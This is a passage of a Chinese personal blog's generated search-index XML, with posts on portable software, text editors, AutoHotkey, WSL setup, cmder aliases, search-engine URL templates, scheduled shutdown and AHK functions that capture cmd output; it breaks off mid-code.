+        <content type="html"><![CDATA[<h1 id="为什么要收藏网页"><a href="#为什么要收藏网页" class="headerlink" title="为什么要收藏网页"></a>为什么要收藏网页</h1><p>平常会在网上看很多的教程,有时候需要重复观看,总不能次次历史记录中查看吧,有时候网站会失效,所以有更加有效的保存网页的方式来替代简单的书签收藏</p><h1 id="wps收藏"><a href="#wps收藏" class="headerlink" title="wps收藏"></a>wps收藏</h1><p>wps提供了类似笔记软件的收藏页面的功能,存在wps的服务器上,相对笔记软件的网页剪藏,支持手机端操作,也算是吊打,wps服务器也相对来说可以信任,只是导出较为麻烦,但是很多教程本身也就是能够长期看就可以了,没有导出的需求,所以也无需杞人忧天,另外非会员的话,wps的存储就只有1g了,存储有限,但是网页笔记的占用一个只有几kb,所以这个也是杞人忧天</p><h1 id="收藏离线网页"><a href="#收藏离线网页" class="headerlink" title="收藏离线网页"></a>收藏离线网页</h1><p>最小占用就是取出样式,值保留文本和内容的图片,损失一部分样式就是了,实际上没有必要,很多网页确实会多看几次,能在wps上在线看也行的,但是根本没有必要专门用自己的硬盘来存,部分pdf的形式的,保存本地也还可以,当然,同样存在wps云上和上面的网页统一更好</p><p>综上:我个人目前是不存离线网页了</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 博客 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 博客 </tag>
+            
+            <tag> 网页 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>便携软件的选择</title>
+      <link href="/2024/01/29/%E4%BE%BF%E6%90%BA%E8%BD%AF%E4%BB%B6%E7%9A%84%E9%80%89%E6%8B%A9/"/>
+      <url>/2024/01/29/%E4%BE%BF%E6%90%BA%E8%BD%AF%E4%BB%B6%E7%9A%84%E9%80%89%E6%8B%A9/</url>
+      
+        <content type="html"><![CDATA[<h1 id="便携软件"><a href="#便携软件" class="headerlink" title="便携软件"></a>便携软件</h1><p>可能包含了一部分绿色软件的定义,我认为的便携软件就是:</p><ol><li><p>配置在自身的文件夹中</p></li><li><p>数据和缓存文件最好能够自定义在当前使用电脑,这个不要随自己的包带着</p></li><li><p>可选是否关联文件的系统打开方式</p></li><li><p>尽量不写入其他的注册表项目</p></li></ol><p>某些便携软件无法自定义缓存或者日志的路径,在同步网盘中的效果稍微有些不好,这是便携软件的一个小缺点</p><h1 id="软件使用层次"><a href="#软件使用层次" class="headerlink" title="软件使用层次"></a>软件使用层次</h1><ol><li><p>最常用,需要多台电脑中同步使用,便携u盘携带使用的软件,包括tc,ahk,gvim,cmder之类的,一定是便携版,这些软件不仅使用频率高,并且都是需要相当大量的配置的,不可能每次还导入配置啥的</p></li><li><p>其次就是部分不常用,需要配置的软件这类一般存一份便携版在我电脑的program目录中,</p></li><li><p>最后就是一些无需配置也能使用的程序,这些有winget的就winget,没有的便携也可以</p></li><li><p>winget,便携都没有的,才凑合考虑一些安装包,这类是很少的,但是也有例外,比如lis,由于便携版携带了db数据文件,导致同步的过程比较尴尬,我选择安装后用脚本替换配置的形式来达成目标</p></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 软件 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 软件 </tag>
+            
+            <tag> 便携 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文本编辑器</title>
+      <link href="/2024/01/29/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/"/>
+      <url>/2024/01/29/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="本文"><a href="#本文" class="headerlink" title="本文"></a>本文</h1><ol><li><p>编辑器做自己适合的事情,而不是一个vim或者vscode来all in one<br>真理就是减少vim的依赖真的可以舒服很多,我大部分只是简单编辑,和文本处理,这种时候eme比较无脑省事,没必要硬用vim</p></li><li><p>少配置,少插件,少折腾</p></li><li><p>不做开发,配置的方向并不以ide开发为主</p></li><li><p>习惯vim的操作方式,以vim为主,但不想花太多功夫捣鼓vim了</p></li><li><p>本文只讲思路,具体编辑器看各自的细分文章</p></li></ol><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><ol><li>偶尔写点简单代码</li><li>修改配置文件</li><li>审阅日志</li><li>大部分处理文本的需求</li><li>没有typ的情况下简单写md博文</li></ol><a href="/2024/02/01/%E5%85%B3%E4%BA%8Evim/" title="关于vim">关于vim</a><h1 id="emeditor"><a href="#emeditor" class="headerlink" title="emeditor"></a>emeditor</h1><ol><li>复杂的正则批量替换,代替vim</li></ol><h1 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h1><ol><li>小型的code项目</li></ol><a href="/2024/02/01/%E5%85%B3%E4%BA%8Evscode/" title="关于vscode">关于vscode</a><h1 id="typora"><a href="#typora" class="headerlink" title="typora"></a>typora</h1><ol><li>写作</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 软件 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 编辑器 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>关于ahk</title>
+      <link href="/2024/01/29/%E5%85%B3%E4%BA%8Eahk/"/>
+      <url>/2024/01/29/%E5%85%B3%E4%BA%8Eahk/</url>
+      
+        <content type="html"><![CDATA[<h1 id="关于ahk"><a href="#关于ahk" class="headerlink" title="关于ahk"></a>关于ahk</h1><p>ahk只需携带一个1mb的解释器就可以完成大部分功能,有需求的话带上一些库也是可以的</p><p>功能上无论是按键增强还是傻瓜式的点击坐标,模拟按键,找点等自动化需求都是可以完成的</p><p>进阶的调用dll,网页对象之类的也能够胜任</p><h1 id="版本选择"><a href="#版本选择" class="headerlink" title="版本选择"></a>版本选择</h1><p>目前和未来都没有打算升级v2, 目前看来v2在基础功能上没有可见的加强,虽然加强了一些语言的规范性,也可以调用更多的例如webview2这样的,让ahk更像个正经的脚本语言,但是颇有些脱离了我的宗旨:简单的完成个人自动化需求即可,社区甚至有做科学计算的库移植到ahk上的朋友,佩服但是还是觉得这种需求上py都比ahk来的方便</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>个人深度一些的需求还是会根据需求的特点谋求更加合适的语言来解决</p><p>简单说就是,比如 编辑器的需求那我用的是vim自然是viml来解决,不会想着外部的ahk来凑合</p><p>网页上的自动化需求自然也是js脚本来的靠谱,ahk虽然也可以控制网页的对象,但是明显更加麻烦,excel上的自动化自然也是vba,这方面虽然ahk控制com对象也有部分优势,但是还是没有vba做老本行来的靠谱吧</p><p>简单的自动化需求,ahk足矣,到了一些复杂的需求上,求助于gpt写一些py也是不错的选择</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ahk </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ahk </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>wsl配置</title>
+      <link href="/2024/01/29/wsl%E9%85%8D%E7%BD%AE/"/>
+      <url>/2024/01/29/wsl%E9%85%8D%E7%BD%AE/</url>
+      
+        <content type="html"><![CDATA[<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><ol><li>首先打开多个系统功能,命令或者进入系统页面修改都是可以的</li><li>命令打开wsl,微软商店随便下个发行版</li><li>如果进入后报错安装补丁</li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br><span class="line">wsl --<span class="built_in">set</span>-default-version <span class="number">2</span></span><br></pre></td></tr></table></figure><h1 id="ssh以及一些其他问题"><a href="#ssh以及一些其他问题" class="headerlink" title="ssh以及一些其他问题"></a>ssh以及一些其他问题</h1><p><a href="https://zhuanlan.zhihu.com/p/386590591">https://zhuanlan.zhihu.com/p/386590591</a></p><p>直接查询别人写好的安装教程</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> cmd </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cmd </tag>
+            
+            <tag> wsl </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>cmder使用</title>
+      <link href="/2024/01/29/cmder%E4%BD%BF%E7%94%A8/"/>
+      <url>/2024/01/29/cmder%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="为什么用cmder"><a href="#为什么用cmder" class="headerlink" title="为什么用cmder"></a>为什么用cmder</h1><p>简单执行命令的话确实ps,cmd之流是够用的,但是如果经常使用终端的话,一个方便配置,功能加强丰富的终端工具还是必不可少的</p><h1 id="对比wt"><a href="#对比wt" class="headerlink" title="对比wt"></a>对比wt</h1><p>功能还是比wt强的,比如wt的命令别名也只是临时设置,在别的标签页中要重新设置这样,大概看的话wt也只是视觉效果等加强的普通终端吧</p><p>cmder可以自己定义一些环境变量以及别名,在cd之类的文件名提示的逻辑上也不错</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>不带git的版本,git随便winget装上就可以了,带上那么大的gfw一点都不编写了</p><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><h1 id="有啥功能"><a href="#有啥功能" class="headerlink" title="有啥功能"></a>有啥功能</h1><p>^r查找历史命令,搜索屏幕,别名,自带一些linux命令和别名,环境变量,多标签</p><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p>可以用相对于cmder文件夹的形式来添加环境变量,比如cmder所在的便携目录,方便u盘中使用</p><p>当然这个在tc的autorun中加上也是可以的,但是在cmder中加入使用更加稳妥吧,未必是tc中打开的cmder</p><h1 id="命令别名"><a href="#命令别名" class="headerlink" title="命令别名"></a>命令别名</h1><p>比如把shutdown -s -t 0 -f 这个命令缩写为sd,使用起来更加方便,而且不用一个标签页配置一次</p><a href="/2024/01/29/cmder%E5%88%AB%E5%90%8D%E5%88%97%E8%A1%A8/" title="cmder别名列表">cmder别名列表</a><h1 id="路径提示"><a href="#路径提示" class="headerlink" title="路径提示"></a>路径提示</h1><p>cd 之后tab,可以有类似ls带参数的路径列表提示的效果,和linux终端有点像</p><h1 id="wsl"><a href="#wsl" class="headerlink" title="wsl"></a>wsl</h1><p>就是在配置中的任务中修改一下wsl的路径,指向实际安装的wsl发行版的exe的位置,这个后续在wsl安装中细说吧</p><h1 id="git-bash"><a href="#git-bash" class="headerlink" title="git bash"></a>git bash</h1><p>和上面的方法差不多,也就是重新指向一下gitbash的路径罢了,也算是cmder唯一的遗憾了,不是和wt那样自动获取路径的,和系统的集成度不算高吧</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> cmd </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cmd </tag>
+            
+            <tag> 工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>cmder别名列表</title>
+      <link href="/2024/01/29/cmder%E5%88%AB%E5%90%8D%E5%88%97%E8%A1%A8/"/>
+      <url>/2024/01/29/cmder%E5%88%AB%E5%90%8D%E5%88%97%E8%A1%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="关于本文"><a href="#关于本文" class="headerlink" title="关于本文"></a>关于本文</h1><p>备份一下cmder的别名列表<br>大部分常用的命令以别名的形式使用较为方便</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> cmd </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cmd </tag>
+            
+            <tag> 工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>搜索引擎url速查</title>
+      <link href="/2024/01/28/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8Eurl%E9%80%9F%E6%9F%A5/"/>
+      <url>/2024/01/28/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8Eurl%E9%80%9F%E6%9F%A5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="搜索引擎url的高级用法"><a href="#搜索引擎url的高级用法" class="headerlink" title="搜索引擎url的高级用法"></a>搜索引擎url的高级用法</h1><p>比如这个<a href="https://www.google.com/search?hl=zh-CN&lr=zh-CN&safe=active&num=10&q=test%20%25s">https://www.google.com/search?hl=zh-CN&amp;lr=zh-CN&amp;safe=active&amp;num=10&amp;q=test%20%s</a></p><p>设置了界面语言,结果语言以及结果数量和打开安全搜索,以及在搜索词的前面加上了特定文本</p><p>也就是说有特殊需求或者过滤目标的话可以在url上稍微处理一下,另外一个例子是磁力狗的搜索url,这个就不展开说了,可以稍微自定义一下他的筛选结果的方式之类的</p><h1 id="备份搜索引擎列表"><a href="#备份搜索引擎列表" class="headerlink" title="备份搜索引擎列表"></a>备份搜索引擎列表</h1><p>这个列表的搜索引擎可以直接复制到对应可以导入自定义搜索引擎的地方用,这里算是留备份吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b|bili|http://search.bilibili.com/all?keyword=%s</span><br><span class="line">db|douban|https://www.douban.com/search?q=%s</span><br><span class="line">dev|dev|https://devdocs.io/help?q=%s</span><br><span class="line">git|git|https://github.com/search?utf8=%E2%9C%93&amp;q=%s</span><br><span class="line">gk|gk|https://www.ghxi.com/?s=%s</span><br><span class="line">z|zh|https://www.zhihu.com/search?type=content&amp;q=%s</span><br><span class="line">g|google|https://www.google.com/search?hl=zh-CN&amp;lr=zh-CN&amp;safe=active&amp;num=10&amp;q=%s</span><br><span class="line">mn|萌娘百科|https://zh.moegirl.org.cn/index.php?fulltext=1&amp;search=%s</span><br><span class="line"># 漫画相关</span><br><span class="line">bg|bangumi|https://bgm.tv/subject_search/%s</span><br><span class="line">moe|moe|https://mox.moe/list.php?s=%s</span><br><span class="line">dm|豆瓣音乐|https://search.douban.com/music/subject_search?search_text=%s</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 速查 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 搜索 </tag>
+            
+            <tag> 速查 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>多语言实现最基础的轮子</title>
+      <link href="/2024/01/28/%E5%A4%9A%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E6%9C%80%E5%9F%BA%E7%A1%80%E7%9A%84%E8%BD%AE%E5%AD%90/"/>
+      <url>/2024/01/28/%E5%A4%9A%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E6%9C%80%E5%9F%BA%E7%A1%80%E7%9A%84%E8%BD%AE%E5%AD%90/</url>
+      
+        <content type="html"><![CDATA[<h1 id="做啥的"><a href="#做啥的" class="headerlink" title="做啥的"></a>做啥的</h1><p>我常用的编程语言大概有七个,虽然主要需求是办公自动化,但是多语言切换写的时候还是经常有记不得一些小细节怎么写,<br>本文主要就是记录一些非常细小的轮子如何在7个常用的脚本语言中实现</p><h1 id="按空格分割一段文本成一个数组-遍历每个元素"><a href="#按空格分割一段文本成一个数组-遍历每个元素" class="headerlink" title="按空格分割一段文本成一个数组,遍历每个元素"></a>按空格分割一段文本成一个数组,遍历每个元素</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">text := <span class="string">&quot;This is a sample text&quot;</span></span><br><span class="line">array := StrSplit(text, <span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">Loop %</span> array.Length()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">    MsgBox %</span> array[<span class="built_in">A_Index</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&quot;This is a sample text&quot;</span></span><br><span class="line">array = text.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> array:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> text = <span class="string">&quot;This is a sample text&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> array = text.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; array.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(array[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> text = <span class="string">&quot;This is a sample text&quot;</span></span><br><span class="line"><span class="keyword">let</span> array = <span class="keyword">split</span>(text, <span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> item in array</span><br><span class="line">    <span class="keyword">echo</span> item</span><br><span class="line"><span class="keyword">endfor</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$text</span> = <span class="string">&quot;This is a sample text&quot;</span></span><br><span class="line"><span class="variable">$array</span> = <span class="variable">$text</span> <span class="operator">-split</span> <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$item</span> <span class="keyword">in</span> <span class="variable">$array</span>) &#123;</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="variable">$item</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">set</span> text=This is a sample text</span><br><span class="line"><span class="keyword">for</span> <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="variable">%text%</span>) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Dim</span> <span class="keyword">text</span> <span class="keyword">As</span> <span class="type">String</span> = <span class="string">&quot;This is a sample text&quot;</span></span><br><span class="line"><span class="keyword">Dim</span> array() <span class="keyword">As</span> <span class="type">String</span> = <span class="keyword">text</span>.Split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> item <span class="keyword">As</span> <span class="type">String</span> <span class="keyword">In</span> array</span><br><span class="line">    Console.WriteLine(item)</span><br><span class="line"><span class="keyword">Next</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> code </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ahk </tag>
+            
+            <tag> code </tag>
+            
+            <tag> bat </tag>
+            
+            <tag> ps </tag>
+            
+            <tag> py </tag>
+            
+            <tag> js </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>定时关机</title>
+      <link href="/2024/01/28/%E5%AE%9A%E6%97%B6%E5%85%B3%E6%9C%BA/"/>
+      <url>/2024/01/28/%E5%AE%9A%E6%97%B6%E5%85%B3%E6%9C%BA/</url>
+      
+        <content type="html"><![CDATA[<h1 id="定时关机的意义"><a href="#定时关机的意义" class="headerlink" title="定时关机的意义"></a>定时关机的意义</h1><p>家里使用win电脑作为影视服务器等,但是我睡觉的时候不需要服务,所以差不多每天一点左右关机<br>我的这个win电脑差不多就是一个可以关机的nas的定位</p><h1 id="关机方案"><a href="#关机方案" class="headerlink" title="关机方案"></a>关机方案</h1><ol><li>计划任务,设置定时执行关机bat脚本即可,坑就是关于命名的时候不能和shutdown重名</li><li>winoff,autooff等工具,或者自己写判断类的脚本,这个拓展了一些条件关机吧,比如网卡活动流量低于某个数值多长时间关机这样的</li></ol><h1 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h1><p>不仅仅部分程序无法关闭可能导致关机失败,也有时候刚刚远程这台电脑,跳提示关不掉,当然修改注册表也能解决,这里可以在关机的时候加上强制结束进程的参数完成关机</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> nas </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 定时关机 </tag>
+            
+            <tag> 计划任务 </tag>
+            
+            <tag> win日常使用 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>可执行文件的命名</title>
+      <link href="/2024/01/28/shutdown%E8%84%9A%E6%9C%AC%E4%B8%8E%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E5%91%BD%E5%90%8D/"/>
+      <url>/2024/01/28/shutdown%E8%84%9A%E6%9C%AC%E4%B8%8E%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E5%91%BD%E5%90%8D/</url>
+      
+        <content type="html"><![CDATA[<h1 id="事项"><a href="#事项" class="headerlink" title="事项"></a>事项</h1><p>今天写一个计划关机相关的简单gui工具代替autooff这样的简单的计划任务关机工具,测试关机命令的时候,建立了一个shutdown.bat和shutdown.ahk,测试的过程中发现这两个文件无法正常执行完成关机,非常诡异</p><h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>shutdown.bat在执行的时候由于执行的命令和bat文件名相同,造成无限死循环重复执行,导致无法成功关机</p><h1 id="关于可执行文件的命名"><a href="#关于可执行文件的命名" class="headerlink" title="关于可执行文件的命名"></a>关于可执行文件的命名</h1><p><strong>可执行文件的名字千万不要和命令撞名字了</strong>,shutdown这样撞名字的真是想破脑袋没发现问题,只以为是权限的问题</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> cmd </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cmd </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ahk获取cmd输出</title>
+      <link href="/2024/01/27/ahk%E8%8E%B7%E5%8F%96cmd%E8%BE%93%E5%87%BA/"/>
+      <url>/2024/01/27/ahk%E8%8E%B7%E5%8F%96cmd%E8%BE%93%E5%87%BA/</url>
+      
+        <content type="html"><![CDATA[<h1 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h1><figure class="highlight ahk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cmdReturn(command)&#123;</span><br><span class="line">    <span class="comment">; WshShell 对象: http://msdn.microsoft.com/en-us/library/aew9yb99</span></span><br><span class="line">    shell := ComObjCreate(<span class="string">&quot;WScript.Shell&quot;</span>)</span><br><span class="line">    <span class="comment">; 通过 cmd.exe 执行单条命令</span></span><br><span class="line">    exec := shell.Exec(<span class="built_in">ComSpec</span> <span class="string">&quot; /C &quot;</span> command)</span><br><span class="line">    <span class="comment">; 读取并返回命令的输出</span></span><br><span class="line">    <span class="keyword">return</span> exec.StdOut.ReadAll()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="后台运行cmd缓存到文本文件读取"><a href="#后台运行cmd缓存到文本文件读取" class="headerlink" title="后台运行cmd缓存到文本文件读取"></a>后台运行cmd缓存到文本文件读取</h1><figure class="highlight ahk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmdSilenceReturn(command)&#123;</span><br><span class="line">CMDReturn:=<span class="string">&quot;&quot;</span></span><br><span class="line">cmdFN:=<span class="string">&quot;RunAnyCtrlCMD&quot;</span></span><br><span class="line">try&#123;</span><br><span class="line"><span class="built_in">RunWait,</span>% <span class="built_in">ComSpec</span> <span class="string">&quot; /C &quot;</span> command <span class="string">&quot; &gt; &quot;</span><span class="string">&quot;%Temp%\&quot;</span> cmdFN <span class="string">&quot;.log&quot;</span><span class="string">&quot;&quot;</span>,, Hide</span><br><span class="line"><span class="built_in">FileRead,</span> CMDReturn, <span class="variable">%A_Temp%</span>\<span class="variable">%cmdFN%</span>.log</span><br><span class="line"><span class="built_in">FileDelete,</span><span class="variable">%A_Temp%</span>\<span class="variable">%cmdFN%</span>.log</span><br><span class="line">&#125;catch&#123;&#125;</span><br><span class="line"><span class="keyword">return</span> CMDReturn</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="隐藏运行cmd输出到剪切板读取"><a href="#隐藏运行cmd输出到剪切板读取" class="headerlink" title="隐藏运行cmd输出到剪切板读取"></a>隐藏运行cmd输出到剪切板读取</h1><figure class="highlight ahk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">cmdClipReturn(command)&#123;</span><br><span class="line">cmdInfo:=<span class="string">&quot;&quot;</span></span><br><span class="line">Clip_Saved:=<span class="built_in">ClipboardAll</span></span><br><span class="line">try&#123;</span><br><span class="line"><span class="built_in">Clipboard</span>:=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">Run,</span>% <span class="built_in">ComSpec</span> <span class="string">&quot; /C &quot;</span> command <span class="string">&quot; | CLIP&quot;</span>, , Hide</span><br><span class="line"><span class="built_in">ClipWait,</span><span class="number">2</span></span><br><span class="line">cmdInfo:=<span class="built_in">Clipboard</span></span><br><span class="line">&#125;catch&#123;&#125;</span><br><span class="line"><span class="built_in">Clipboard</span>:=Clip_Saved</span><br><span class="line"><span class="keyword">return</span> cmdInfo</span><br><span class="line">&#125;</span><br><span class="line">[StdoutToVar取命令结果（第三方）]</span><br><span class="line"></span><br><span class="line">StdoutToVar_CreateProcess(sCmd, sEncoding:=<span class="string">&quot;CP0&quot;</span>, sDir:=<span class="string">&quot;&quot;</span>, ByRef nExitCode:=<span class="number">0</span>) &#123;</span><br><span class="line">    DllCall( <span class="string">&quot;CreatePipe&quot;</span>,           PtrP,hStdOutRd, PtrP,hStdOutWr, Ptr,<span class="number">0</span>, UInt,<span class="number">0</span> )</span><br><span class="line">    DllCall( <span class="string">&quot;SetHandleInformation&quot;</span>, Ptr,hStdOutWr, UInt,<span class="number">1</span>, UInt,<span class="number">1</span>                 )</span><br><span class="line"> </span><br><span class="line"><span class="title">            VarSetCapacity( pi, (A_PtrSize == 4) ? 16 :</span> <span class="number">24</span>,  <span class="number">0</span> )</span><br><span class="line"><span class="title">    siSz := VarSetCapacity( si, (A_PtrSize == 4) ? 68 :</span> <span class="number">104</span>, <span class="number">0</span> )</span><br><span class="line">    NumPut( siSz,      si,  <span class="number">0</span>,                          <span class="string">&quot;UInt&quot;</span> )</span><br><span class="line"><span class="title">    NumPut( 0x100,     si,  (A_PtrSize == 4) ? 44 :</span> <span class="number">60</span>, <span class="string">&quot;UInt&quot;</span> )</span><br><span class="line"><span class="title">    NumPut( hStdOutWr, si,  (A_PtrSize == 4) ? 60 :</span> <span class="number">88</span>, <span class="string">&quot;Ptr&quot;</span>  )</span><br><span class="line"><span class="title">    NumPut( hStdOutWr, si,  (A_PtrSize == 4) ? 64 :</span> <span class="number">96</span>, <span class="string">&quot;Ptr&quot;</span>  )</span><br><span class="line"> 